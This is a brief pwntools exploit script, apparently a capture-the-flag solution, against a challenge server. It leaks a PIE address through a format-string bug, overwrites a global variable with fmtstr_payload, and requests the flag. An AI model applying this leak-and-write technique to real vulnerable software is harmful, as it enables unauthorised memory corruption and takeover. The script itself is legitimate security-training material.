from pwn import *

context.arch = 'amd64'

# p = process('./chal')
p = remote('chal.amt.rs', 1338)

pay = b'%p.'*0x20
p.sendlineafter(b'say:',pay)
for _ in range(14):
    p.recvuntil(b'.')

pie = int(p.recvuntil(b'.')[:-1],16) - 0x1678
bear = pie + 0x4044
print(hex(bear))

pay = fmtstr_payload(22, {bear:p32(0xBAD0BAD)}, write_size='byte')
p.sendlineafter(b'say:',pay)

p.sendlineafter(b'say:',b'flag')

p.interactive()